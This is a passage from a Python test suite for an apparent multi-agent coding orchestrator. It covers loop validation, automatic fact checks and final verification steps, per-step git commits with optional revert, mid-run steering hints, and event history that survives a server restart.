    bad_check = Loop(name="x", nodes=[LoopNode(id="a", role="tester", check="backend",
                                               on={SUCCESS: Edge(EXIT_LOOP)})])
    assert "cannot check work" in validate(bad_check, roles, verifiers)

    impossible = Loop(name="x", nodes=[LoopNode(id="a", role="tester",
                                                on={SUCCESS: Edge(EXIT_LOOP),
                                                    CHECK_FAILED: Edge(EXIT_LOOP)})])
    assert "can never happen" in validate(impossible, roles, verifiers)


def test_the_seeded_loop_is_valid_and_describes_the_common_shape(tmp_path):
    from trance.agents.roles import BUILTIN_ROLES as R
    from trance.agents.store import LoopStore
    from trance.loops import validate

    loops = LoopStore(tmp_path / "loops.json").all()
    assert [l.name for l in loops] == ["test-and-fix"]
    assert validate(loops[0], set(R), {n for n, r in R.items() if r.verifier}) is None
    assert loops[0].roles() == ["tester", "backend"]


def test_a_flow_step_can_name_a_loop_and_pulls_in_its_agents(tmp_path):
    """A loop calling an agent the session has never heard of fails at run
    time, after everything before it has run."""
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    app = app_module.create_app(config, tmp_path / "sessions")
    client = TestClient(app)

    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]
    body = client.put(f"/api/sessions/{sid}/flow", json={"steps": [
        {"role": "", "loop": "test-and-fix", "task": "make it bounce"}]}).json()

    assert body["steps"][0]["runs_a_loop"] is True
    team = {r["name"] for r in body["team"]}
    assert {"tester", "backend"} <= team

    bad = client.put(f"/api/sessions/{sid}/flow",
                     json={"steps": [{"role": "", "loop": "nope", "task": "t"}]})
    assert bad.status_code == 400 and "unknown loop" in bad.json()["detail"]


def test_a_loop_in_use_cannot_be_deleted(tmp_path):
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))

    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]
    client.put(f"/api/sessions/{sid}/flow",
               json={"steps": [{"role": "", "loop": "test-and-fix", "task": "t"}]})

    blocked = client.delete("/api/loops/test-and-fix")
    assert blocked.status_code == 409 and "used by" in blocked.json()["detail"]


def test_an_invalid_loop_is_refused_by_the_api(tmp_path):
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))

    response = client.put("/api/loops/broken", json={"nodes": [
        {"id": "a", "role": "tester", "on": {"SUCCESS": {"target": "a"}}}]})
    assert response.status_code == 400
    assert "exits successfully" in response.json()["detail"]


def test_a_single_step_retries_itself_with_no_fixer_offered(tmp_path, monkeypatch):
    """The step editor no longer offers another agent, so the engine must do
    the obvious thing with what it is given."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend"])
    step = Step(role="backend", task="t", max_loops=3)
    assert step.fixer == "backend"           # itself, not a second agent
    calls = []

    def fake(**kw):
        calls.append(kw["role"].name)
        return _Turn(None, "no", outcome=("FAILED", "still broken"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert calls == ["backend", "backend", "backend"]
    assert step.status == "failed"


def test_a_flow_saved_with_an_old_fixer_still_runs(tmp_path, monkeypatch):
    """Sessions built before loops existed keep working."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "reviewer"])
    step = Step(role="backend", task="t", on_fail="reviewer", max_loops=2)
    calls = []

    def fake(**kw):
        calls.append(kw["role"].name)
        return _Turn(None, "no", outcome=("FAILED", "nope"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)
    assert calls == ["backend", "reviewer", "backend"]


# ------------------------ the plan always ends by verifying itself

def test_a_plan_that_forgets_to_test_gets_a_final_loop(tmp_path):
    """A model that has just written a convincing ten-step plan is exactly the
    one that stops at the last feature."""
    from trance.agents.orchestrator import ensure_final_check
    from trance.agents.roles import BUILTIN_ROLES as R
    from trance.agents.store import LoopStore

    loops = LoopStore(tmp_path / "loops.json")
    proposal = {"summary": "s", "team": ["backend"], "steps": [
        {"role": "backend", "loop": "", "task": "build the API", "check": None,
         "on_fail": None, "max_loops": 2, "points": 3}]}

    out = ensure_final_check(proposal, loops=loops, roles=list(R.values()))

    assert len(out["steps"]) == 2
    assert out["steps"][-1]["loop"] == "test-and-fix"
    assert out["added_final_check"] == "test-and-fix"
    assert "run the tests" in out["steps"][-1]["task"]
    assert {"tester", "backend"} <= set(out["team"])      # the loop's agents come too


def test_a_plan_that_already_ends_in_verification_is_left_alone(tmp_path):
    from trance.agents.orchestrator import ensure_final_check
    from trance.agents.roles import BUILTIN_ROLES as R
    from trance.agents.store import LoopStore

    loops = LoopStore(tmp_path / "loops.json")
    roles = list(R.values())

    ends_with_loop = {"summary": "s", "team": [], "steps": [
        {"role": "backend", "loop": "", "task": "build"},
        {"role": "", "loop": "test-and-fix", "task": "test"}]}
    assert "added_final_check" not in ensure_final_check(
        ends_with_loop, loops=loops, roles=roles)

    ends_with_tester = {"summary": "s", "team": [], "steps": [
        {"role": "backend", "loop": "", "task": "build"},
        {"role": "tester", "loop": "", "task": "test it"}]}
    assert "added_final_check" not in ensure_final_check(
        ends_with_tester, loops=loops, roles=roles)

    # A fact check is not end-to-end verification: it confirms the files exist,
    # not that anyone ran them. Now that it is added to every writing step,
    # counting it would mean no plan ever got a final test.
    fact_checked = {"summary": "s", "team": [], "steps": [
        {"role": "backend", "loop": "", "task": "build", "check": "factchecker"}]}
    assert ensure_final_check(fact_checked, loops=loops,
                              roles=roles)["added_final_check"] == "test-and-fix"

    really_checked = {"summary": "s", "team": [], "steps": [
        {"role": "backend", "loop": "", "task": "build", "check": "tester"}]}
    assert "added_final_check" not in ensure_final_check(
        really_checked, loops=loops, roles=roles)


def test_a_loop_is_preferred_over_a_bare_tester_step(tmp_path):
    """A tester step reports the bug and stops; a loop gets it fixed and
    tested again."""
    from trance.agents.orchestrator import ensure_final_check
    from trance.agents.roles import BUILTIN_ROLES as R
    from trance.agents.store import LoopStore

    with_loops = LoopStore(tmp_path / "a.json")
    without = LoopStore(tmp_path / "b.json", seed=False)
    proposal = lambda: {"summary": "s", "team": [], "steps": [
        {"role": "backend", "loop": "", "task": "build"}]}

    assert ensure_final_check(proposal(), loops=with_loops,
                              roles=list(R.values()))["steps"][-1]["loop"] == "test-and-fix"
    fallback = ensure_final_check(proposal(), loops=without, roles=list(R.values()))
    assert fallback["steps"][-1]["role"] == "tester" and not fallback["steps"][-1]["loop"]


def test_nothing_is_invented_when_no_agent_can_verify(tmp_path):
    from trance.agents.orchestrator import ensure_final_check
    from trance.agents.roles import BUILTIN_ROLES as R
    from trance.agents.store import LoopStore

    unable = [r for r in R.values() if not r.verifier]
    proposal = {"summary": "s", "team": [], "steps": [
        {"role": "backend", "loop": "", "task": "build"}]}
    out = ensure_final_check(proposal, loops=LoopStore(tmp_path / "x.json", seed=False),
                             roles=unable)
    assert len(out["steps"]) == 1 and "added_final_check" not in out


def test_the_orchestrator_can_put_a_loop_on_a_step(tmp_path, monkeypatch):
    from trance.agents import orchestrator
    from trance.agents.store import LoopStore
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse, ToolCall

    loops = LoopStore(tmp_path / "loops.json")
    captured = {}

    class FakeClient:
        def complete(self, messages, tools=None, **kw):
            captured["system"] = messages[0]["content"]
            captured["schema"] = tools[0]["function"]["parameters"]
            return ChatResponse(text="", tool_calls=[ToolCall(
                id="c", name="propose_flow", arguments={
                    "summary": "s", "team": ["backend"], "steps": [
                        {"role": "backend", "task": "build it", "points": 3},
                        {"loop": "test-and-fix", "task": "make it pass", "points": 3}]})])

    monkeypatch.setattr(orchestrator, "client_for", lambda config: FakeClient())
    result = orchestrator.chat(messages=[{"role": "user", "content": "build a thing"}],
                               project_dir=tmp_path, config=ModelConfig(), bus=EventBus(),
                               session_id="s", loops=loops)

    step_props = captured["schema"]["properties"]["steps"]["items"]["properties"]
    assert step_props["loop"]["enum"] == ["test-and-fix"]
    assert "END THE PLAN BY VERIFYING IT" in captured["system"]
    assert "test-and-fix" in captured["system"]

    steps = result["proposal"]["steps"]
    assert steps[-1]["loop"] == "test-and-fix" and steps[-1]["role"] == ""
    assert "added_final_check" not in result["proposal"]   # it did not forget


def test_a_step_that_writes_files_gets_a_fact_check(tmp_path):
    """An agent reporting SUCCESS is the one thing here with no independent
    evidence behind it."""
    from trance.agents.orchestrator import ensure_checks
    from trance.agents.roles import BUILTIN_ROLES as R

    proposal = {"summary": "s", "team": ["backend"], "steps": [
        {"role": "backend", "loop": "", "task": "build the API", "check": None},
        {"role": "frontend", "loop": "", "task": "build the UI", "check": None}]}
    out = ensure_checks(proposal, roles=list(R.values()))

    assert [s["check"] for s in out["steps"]] == ["factchecker", "factchecker"]
    assert out["added_checks"] == 2
    assert "factchecker" in out["team"]          # and it joins the team


def test_a_check_the_orchestrator_chose_is_left_alone(tmp_path):
    from trance.agents.orchestrator import ensure_checks
    from trance.agents.roles import BUILTIN_ROLES as R

    proposal = {"summary": "s", "team": [], "steps": [
        {"role": "backend", "loop": "", "task": "t", "check": "tester"}]}
    out = ensure_checks(proposal, roles=list(R.values()))
    assert out["steps"][0]["check"] == "tester"
    assert "added_checks" not in out


def test_nothing_is_checked_where_nothing_is_written(tmp_path):
    """A loop carries its own wiring, and an agent with no file access has
    nothing for a fact check to look at."""
    from trance.agents.orchestrator import ensure_checks
    from trance.agents.roles import BUILTIN_ROLES as R

    proposal = {"summary": "s", "team": [], "steps": [
        {"role": "", "loop": "test-and-fix", "task": "test it", "check": None},
        {"role": "planner", "loop": "", "task": "plan it", "check": None}]}
    out = ensure_checks(proposal, roles=list(R.values()))

    assert [s["check"] for s in out["steps"]] == [None, None]
    assert "added_checks" not in out


def test_the_orchestrator_is_told_to_check_every_writing_step(tmp_path, monkeypatch):
    from trance.agents import orchestrator
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    captured = {}

    class FakeClient:
        def complete(self, messages, tools=None, **kw):
            captured["system"] = messages[0]["content"]
            return ChatResponse(text="ok")

    monkeypatch.setattr(orchestrator, "client_for", lambda config: FakeClient())
    orchestrator.chat(messages=[{"role": "user", "content": "hi"}], project_dir=tmp_path,
                      config=ModelConfig(), bus=EventBus(), session_id="s")

    assert "PUT A CHECK ON EVERY STEP THAT WRITES FILES" in captured["system"]
    assert "taken at its word" in captured["system"]


def test_the_whole_proposal_pipeline_checks_and_verifies(tmp_path, monkeypatch):
    """The two guarantees compose: every writing step checked, and the plan
    ends by testing itself."""
    from trance.agents import orchestrator
    from trance.agents.store import LoopStore
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse, ToolCall

    class FakeClient:
        def complete(self, messages, tools=None, **kw):
            return ChatResponse(text="", tool_calls=[ToolCall(
                id="c", name="propose_flow", arguments={
                    "summary": "s", "team": ["devops", "backend"], "steps": [
                        {"role": "devops", "task": "scaffold", "points": 2},
                        {"role": "backend", "task": "build the API", "points": 3}]})])

    monkeypatch.setattr(orchestrator, "client_for", lambda config: FakeClient())
    result = orchestrator.chat(messages=[{"role": "user", "content": "build"}],
                               project_dir=tmp_path, config=ModelConfig(), bus=EventBus(),
                               session_id="s", loops=LoopStore(tmp_path / "l.json"))

    steps = result["proposal"]["steps"]
    assert [s["check"] for s in steps[:2]] == ["factchecker", "factchecker"]
    assert steps[-1]["loop"] == "test-and-fix"
    assert {"devops", "backend", "factchecker", "tester"} <= set(result["proposal"]["team"])


def test_a_step_keeps_the_window_reading_it_ended_on(tmp_path, monkeypatch):
    """The live gauge disappears with the step that was running; keeping the
    last reading is how you compare one step against another."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend"])
    step = Step(role="backend", task="t")
    monkeypatch.setattr("trance.engine.run_agent",
                        lambda **kw: _Turn(None, "x", outcome=("SUCCESS", "")))
    engine._execute(step)

    assert step.attempts[-1].context["tokens"] == 12000
    assert step.attempts[-1].context["window"] == 64000
    assert step.to_dict()["attempts"][-1]["context"]["percent"] == 18.8


def test_the_runner_records_the_window_it_last_used(tmp_path, monkeypatch):
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    class Counter:
        def complete(self, messages, tools=None, **kw):
            return ChatResponse(text="OUTCOME: SUCCESS", usage={"prompt_tokens": 4321})

    monkeypatch.setattr(runner, "client_for", lambda config: Counter())
    turn = runner.run_agent(role=BUILTIN_ROLES["backend"], task="t", project=tmp_path,
                            config=ModelConfig(context_window=64000), bus=EventBus(),
                            session_id="s", step_id="st")

    assert turn.context["tokens"] == 4321
    assert turn.context["estimated"] is False


def test_changing_a_setting_does_not_discard_completed_work():
    """Regression: after a refresh every done step came back pending. Saving
    the flow compared the check and the derived fixer, so a plan that had
    changed server-side re-queued everything and wiped its history."""
    done = Step(id="a", role="backend", task="build", status="done",
                check="factchecker", attempts=[Attempt(n=1, outcome="SUCCESS")])
    flow = Flow(steps=[done])

    # A browser that never saw the server-added check sends it back as none.
    outcome = flow.apply_edits([Step.from_dict(
        {"id": "a", "role": "backend", "task": "build", "check": None})])

    assert outcome["requeued"] == []
    assert flow.steps[0].status == "done"
    assert len(flow.steps[0].attempts) == 1        # the history survives
    assert flow.steps[0].check is None             # but the setting is applied


def test_what_a_step_did_survives_a_restart(tmp_path):
    """A restart used to leave every finished step with no history and no
    record of what it cost."""
    from trance.session import SessionStore

    store = SessionStore(tmp_path)
    session = store.create("p", "/tmp/p")
    session.flow.steps = [Step(role="backend", task="a", status="done")]
    session.flow.steps[0].attempts = [Attempt(
        n=1, outcome="SUCCESS", files_written=["server.js"],
        context={"tokens": 2000, "window": 64000, "percent": 3.1},
        gate_results=[GateResult(gate="factchecker", verdict="PASS")])]
    store.save(session)

    back = SessionStore(tmp_path).get(session.id).flow.steps[0]
    assert back.status == "done" and len(back.attempts) == 1
    assert back.attempts[0].outcome == "SUCCESS"
    assert back.attempts[0].files_written == ["server.js"]
    assert back.attempts[0].context["tokens"] == 2000
    assert back.attempts[0].gate_results[0].verdict == "PASS"


def test_a_symbol_written_this_step_can_be_looked_up(tmp_path):
    """The index is a snapshot from before the step, so an agent asking about a
    file it just wrote got "no symbol named …" for something plainly there."""
    from trance.agents.tools import AgentTools
    from trance.db import GraphDB
    from trance.indexer.service import index_repo
    from trance.worker.tools import ContextTools

    (tmp_path / "server").mkdir()
    (tmp_path / "server" / "old.py").write_text("def existing():\n    return 1\n")
    db = GraphDB(tmp_path / "g.db")
    index_repo(tmp_path, db)

    reindexed = []

    def reindex():
        reindexed.append(1)
        index_repo(tmp_path, db)

    tools = AgentTools(tmp_path, BUILTIN_ROLES["backend"], ContextTools(db, tmp_path),
                       notify=lambda *a, **k: None, reindex=reindex)

    tools.call("write_file", {"path": "server/app.py",
                              "content": "def gameLoop():\n    return 2\n"})
    found = tools.call("get_definition", {"symbol": "server/app.py::gameLoop"})

    assert found.ok is True and "return 2" in found.text
    assert reindexed == [1]                     # once, not on every miss


def test_a_genuine_miss_does_not_reindex_forever(tmp_path):
    from trance.agents.tools import AgentTools
    from trance.db import GraphDB
    from trance.indexer.service import index_repo
    from trance.worker.tools import ContextTools

    (tmp_path / "a.py").write_text("def real():\n    pass\n")
    db = GraphDB(tmp_path / "g.db")
    index_repo(tmp_path, db)
    calls = []
    tools = AgentTools(tmp_path, BUILTIN_ROLES["backend"], ContextTools(db, tmp_path),
                       notify=lambda *a, **k: None,
                       reindex=lambda: calls.append(1))

    tools.call("write_file", {"path": "b.py", "content": "x = 1\n"})
    for _ in range(5):
        tools.call("get_definition", {"symbol": "nothing_like_this"})
    # One for the write, one for anything else that may have changed the tree,
    # and then it stops: a model guessing names would re-index once per guess.
    assert calls == [1, 1]


def test_a_miss_is_retried_once_even_with_no_write(tmp_path):
    from trance.agents.tools import AgentTools
    from trance.db import GraphDB
    from trance.indexer.service import index_repo
    from trance.worker.tools import ContextTools

    (tmp_path / "a.py").write_text("def real():\n    pass\n")
    db = GraphDB(tmp_path / "g.db")
    index_repo(tmp_path, db)
    calls = []
    tools = AgentTools(tmp_path, BUILTIN_ROLES["backend"], ContextTools(db, tmp_path),
                       notify=lambda *a, **k: None, reindex=lambda: calls.append(1))

    # One allowance covers files a command or another agent changed; after that
    # a miss is a real miss.
    for _ in range(4):
        tools.call("get_definition", {"symbol": "missing"})
    assert calls == [1]


def test_search_symbols_finds_what_was_just_written(tmp_path):
    """Six searches in a row all missed functions that were plainly in the file
    — the index simply had not seen it yet."""
    from trance.agents.tools import AgentTools
    from trance.db import GraphDB
    from trance.indexer.service import index_repo
    from trance.worker.tools import ContextTools

    (tmp_path / "server").mkdir()
    (tmp_path / "server" / "seed.py").write_text("def seeded():\n    pass\n")
    db = GraphDB(tmp_path / "g.db")
    index_repo(tmp_path, db)

    tools = AgentTools(tmp_path, BUILTIN_ROLES["backend"], ContextTools(db, tmp_path),
                       notify=lambda *a, **k: None,
                       reindex=lambda: index_repo(tmp_path, db))

    tools.call("write_file", {"path": "server/game.py",
                              "content": "def collectPelletAt():\n    pass\n\n"
                                         "def eatGhost():\n    pass\n"})

    first = tools.call("search_symbols", {"pattern": "collectPelletAt"})
    assert first.detail["hit"] is True

    # And the ones after it, from the same re-index rather than another.
    second = tools.call("search_symbols", {"pattern": "eatGhost"})
    assert second.detail["hit"] is True


# ================================ git checkpoints around every step

def _git_engine(tmp_path, team=("backend",)):
    """An engine over a real repository."""
    from trance import vcs

    project = tmp_path / "proj"
    project.mkdir()
    (project / "existing.py").write_text("# the user's own work\n")
    engine = _engine(project, list(team))
    engine.session.project_dir = str(project)
    engine.project = project
    vcs.ensure_repo(project)
    return engine, project


def test_each_step_is_committed(tmp_path, monkeypatch):
    """`git log` becomes the list of what each agent did."""
    from trance import vcs
    from trance.flow import Step

    engine, project = _git_engine(tmp_path)
    engine._prepare_git()

    def fake(**kw):
        (project / "server.py").write_text("def app():\n    return 1\n")
        turn = _Turn(None, "wrote it", outcome=("SUCCESS", ""))
        turn.files_written = ["server.py"]
        return turn

    monkeypatch.setattr("trance.engine.run_agent", fake)
    step = Step(role="backend", task="build the API")
    engine._execute(step)

    subjects = [c["subject"] for c in vcs.log(project)]
    assert any("backend: build the API [SUCCESS]" in s for s in subjects)
    assert not vcs.dirty(project)                     # nothing left uncommitted
    assert step.attempts[0].commit                     # and the step knows its sha


def test_a_failed_step_can_put_the_project_back(tmp_path, monkeypatch):
    """The point of the checkpoint: an agent that made things worse is undone."""
    from trance import vcs
    from trance.flow import Step

    engine, project = _git_engine(tmp_path)
    engine._prepare_git()

    def fake(**kw):
        (project / "existing.py").write_text("# the agent broke this\n")
        (project / "junk.py").write_text("# and left this behind\n")
        return _Turn(None, "made a mess", outcome=("FAILED", "could not finish"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(Step(role="backend", task="build it", max_loops=1,
                         revert_on_fail=True))

    assert (project / "existing.py").read_text() == "# the user's own work\n"
    assert not (project / "junk.py").exists()          # created files go too
    # Undone, not destroyed: the attempt is in history and can be read back.
    assert any("[FAILED]" in c["subject"] for c in vcs.log(project))


def test_without_the_option_a_failure_is_left_in_place(tmp_path, monkeypatch):
    """Half-finished work is often still worth reading, so this is opt-in."""
    from trance.flow import Step

    engine, project = _git_engine(tmp_path)
    engine._prepare_git()

    def fake(**kw):
        (project / "half.py").write_text("# partly done\n")
        return _Turn(None, "x", outcome=("FAILED", "ran out of ideas"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(Step(role="backend", task="t", max_loops=1))
    assert (project / "half.py").exists()


def test_a_users_uncommitted_work_is_never_reverted_away(tmp_path, monkeypatch):
    """The checkpoint is taken after committing whatever was already there, so
    a revert can only ever take back the step's own changes."""
    from trance.flow import Step

    engine, project = _git_engine(tmp_path)
    (project / "notes.md").write_text("# my own notes, never committed\n")
    engine._prepare_git()                    # commits them before anything runs

    monkeypatch.setattr("trance.engine.run_agent",
                        lambda **kw: _Turn(None, "x", outcome=("FAILED", "no")))
    engine._execute(Step(role="backend", task="t", max_loops=1, revert_on_fail=True))

    assert (project / "notes.md").read_text() == "# my own notes, never committed\n"


def test_a_loop_block_can_revert_itself(tmp_path, monkeypatch):
    """A fixer that made things worse should not hand its mess to the next agent."""
    from trance.agents.store import LoopStore
    from trance.flow import Step
    from trance.loops import EXIT_LOOP, FAILED, FAIL_LOOP, SUCCESS, Edge, Loop, LoopNode

    engine, project = _git_engine(tmp_path, team=("backend", "tester"))
    loop = Loop(name="fixit", start="n1", nodes=[
        LoopNode(id="n1", role="backend", revert_on_fail=True,
                 on={SUCCESS: Edge(EXIT_LOOP), FAILED: Edge(FAIL_LOOP)})])
    store = LoopStore(tmp_path / "loops.json", seed=False)
    store.upsert(loop)
    engine.loops = store
    engine._prepare_git()

    def fake(**kw):
        (project / "broken.py").write_text("# this made it worse\n")
        return _Turn(None, "x", outcome=("FAILED", "worse than before"))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(Step(role="", loop="fixit", task="fix it"))

    assert not (project / "broken.py").exists()


def test_a_project_that_is_not_a_repository_becomes_one(tmp_path):
    from trance import vcs

    project = tmp_path / "fresh"
    project.mkdir()
    engine = _engine(project, ["backend"])
    engine.project = project
    assert not vcs.is_repo(project)

    engine._prepare_git()
    assert vcs.is_repo(project) and engine._git is True


def test_git_can_be_turned_off_entirely(tmp_path, monkeypatch):
    from trance import vcs
    from trance.flow import Step

    engine, project = _git_engine(tmp_path)
    engine.config.git_commits = False
    engine._prepare_git()
    assert engine._git is False

    monkeypatch.setattr("trance.engine.run_agent",
                        lambda **kw: _Turn(None, "x", outcome=("SUCCESS", "")))
    engine._execute(Step(role="backend", task="t"))
    assert vcs.log(project) == []            # nothing was committed


def test_nothing_git_does_can_break_a_run(tmp_path, monkeypatch):
    """git missing, or a broken repo, must not stop an agent working."""
    from trance import vcs

    missing = tmp_path / "nope"
    missing.mkdir()
    assert vcs.commit_all(missing, "x").ok is False    # not a repo, no exception
    assert vcs.undo(missing, "", "").ok is True        # nothing to undo is not a failure
    assert vcs.undo(missing, "deadbeef").ok is False   # a bad sha is
    assert vcs.head(missing) == ""
    assert vcs.log(missing) == []


# ------------------------------- hinting an agent that is already working

def test_a_hint_reaches_the_agent_on_its_next_round(tmp_path, monkeypatch):
    """The moment you notice a wrong assumption is while it is still being
    acted on; waiting for the block to end is most of the value gone."""
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.flow import Step
    from trance.providers.base import ChatResponse, ToolCall

    step = Step(role="backend", task="build it")
    seen = []

    class Worker:
        def __init__(self):
            self.n = 0

        def complete(self, messages, tools=None, **kw):
            self.n += 1
            seen.append([m for m in messages if m.get("role") == "user"])
            if self.n == 1:
                # The user types a hint while this round is in flight.
                step.steering.append("the port is 3100, not 3000")
                return ChatResponse(text="", tool_calls=[
                    ToolCall(id="c1", name="list_files", arguments={})])
            return ChatResponse(text="OUTCOME: SUCCESS")

    monkeypatch.setattr(runner, "client_for", lambda config: Worker())
    turn = runner.run_agent(role=BUILTIN_ROLES["backend"], task=step.task, project=tmp_path,
                            config=ModelConfig(), bus=EventBus(), session_id="s",
                            step_id=step.id, steering_inbox=step.take_steering)

    assert turn.steering_received == 1
    delivered = " ".join(m["content"] for m in seen[-1])
    assert "the port is 3100" in delivered
    assert "correcting what you are doing now" in delivered
    assert step.steering == []                  # taken exactly once


def test_a_hint_is_delivered_once_and_not_repeated(tmp_path, monkeypatch):
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.flow import Step
    from trance.providers.base import ChatResponse, ToolCall

    step = Step(role="backend", task="t")
    step.steering.append("use fetch, not axios")

    class Worker:
        def __init__(self):
            self.n = 0

        def complete(self, messages, tools=None, **kw):
            self.n += 1
            if self.n < 3:
                return ChatResponse(text="", tool_calls=[
                    ToolCall(id=f"c{self.n}", name="list_files", arguments={})])
            self.last = messages
            return ChatResponse(text="OUTCOME: SUCCESS")

    client = Worker()
    monkeypatch.setattr(runner, "client_for", lambda config: client)
    turn = runner.run_agent(role=BUILTIN_ROLES["backend"], task="t", project=tmp_path,
                            config=ModelConfig(), bus=EventBus(), session_id="s",
                            step_id=step.id, steering_inbox=step.take_steering)

    assert turn.steering_received == 1
    hints = [m for m in client.last
             if m.get("role") == "user" and "use fetch" in str(m.get("content"))]
    assert len(hints) == 1


def test_a_running_step_can_be_steered(tmp_path):
    """Regression: steering only ever targeted pending steps, so the one you
    were watching go wrong was the one you could not correct."""
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    app = app_module.create_app(config, tmp_path / "sessions")
    client = TestClient(app)

    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]
    client.put(f"/api/sessions/{sid}/flow", json={"steps": [
        {"role": "backend", "task": "one"}, {"role": "frontend", "task": "two"}]})
    session = app.state.store.get(sid)
    session.flow.steps[0].status = "running"

    body = client.post(f"/api/sessions/{sid}/steer",
                       json={"note": "the port is 3100"}).json()

    assert body["steered"] == [session.flow.steps[0].id]
    assert body["delivering"] is True                   # it is being worked on now
    assert session.flow.steps[0].steering == ["the port is 3100"]
    assert session.flow.steps[1].steering == []         # not sprayed at everything


def test_with_nothing_running_a_hint_waits_for_the_next_step(tmp_path):
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    app = app_module.create_app(config, tmp_path / "sessions")
    client = TestClient(app)

    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]
    client.put(f"/api/sessions/{sid}/flow", json={"steps": [
        {"role": "backend", "task": "one"}, {"role": "frontend", "task": "two"}]})

    body = client.post(f"/api/sessions/{sid}/steer", json={"note": "mind the port"}).json()
    session = app.state.store.get(sid)

    assert body["delivering"] is False
    assert session.flow.steps[0].steering == ["mind the port"]
    assert session.flow.steps[1].steering == []


def test_a_reconnect_ends_on_the_current_state_not_the_history(tmp_path):
    """Regression: a refreshed page showed finished steps as pending. The
    socket replayed every past event after the snapshot, and an old
    flow_updated carries the flow as it was when it fired."""
    import json

    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    app = app_module.create_app(config, tmp_path / "sessions")
    client = TestClient(app)

    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]
    client.put(f"/api/sessions/{sid}/flow", json={"steps": [
        {"role": "backend", "task": "one"}, {"role": "frontend", "task": "two"}]})

    # The flow_updated from that PUT is now in history, with both steps pending.
    session = app.state.store.get(sid)
    session.flow.steps[0].status = "done"

    with client.websocket_connect(f"/ws/{sid}") as ws:
        frames = []
        for _ in range(12):
            frame = json.loads(ws.receive_text())
            frames.append(frame)
            if frame.get("type") == "snapshot" and frames.index(frame) > 0:
                break

    replayed = [f for f in frames if f.get("replay")]
    assert replayed, "history was not replayed"
    assert all(f.get("replay") for f in frames if f.get("type") == "flow_updated")

    # The last word belongs to the snapshot, and it is current.
    last_snapshot = [f for f in frames if f.get("type") == "snapshot"][-1]
    assert frames.index(last_snapshot) > frames.index(replayed[0])
    assert [s["status"] for s in last_snapshot["payload"]["flow"]["steps"]] \
        == ["done", "pending"]


# ============================ the trace outlives the process that made it

def test_a_finished_step_can_still_be_explored_after_a_restart(tmp_path):
    """Restart the server and every prompt, command and loop block a step went
    through was gone, leaving a finished step you could no longer explain."""
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    sessions = tmp_path / "sessions"

    app = app_module.create_app(config, sessions)
    client = TestClient(app)
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]

    bus = app.state.bus
    bus.emit("loop_node", sid, agent="tester", step_id="st1",
             payload={"loop": "test-and-fix", "visit": 1, "role": "tester"})
    bus.emit("tool_call", sid, agent="tester", step_id="st1",
             payload={"name": "run_command", "ok": True,
                      "detail": {"kind": "command", "command": "npm test",
                                 "exit_code": 1, "output": "1 failing"}})
    bus.emit("step_outcome", sid, agent="tester", step_id="st1",
             payload={"outcome": "FAILED", "reason": "the ball passes through"})

    # A whole new process, reading the same directory.
    reborn = app_module.create_app(config, sessions)
    events = TestClient(reborn).get(f"/api/sessions/{sid}/events").json()

    kinds = [e["type"] for e in events]
    assert kinds == ["session_created", "loop_node", "tool_call", "step_outcome"]
    assert events[2]["payload"]["detail"]["command"] == "npm test"
    assert events[3]["payload"]["reason"] == "the ball passes through"
    assert all(e["step_id"] in (None, "st1") for e in events)


def test_the_live_run_is_not_duplicated_by_the_stored_one(tmp_path):
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    app = app_module.create_app(config, tmp_path / "sessions")
    client = TestClient(app)
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]
    app.state.bus.emit("chat", sid, payload={"content": "hello"})

    events = client.get(f"/api/sessions/{sid}/events").json()
    assert [e["id"] for e in events] == sorted({e["id"] for e in events},
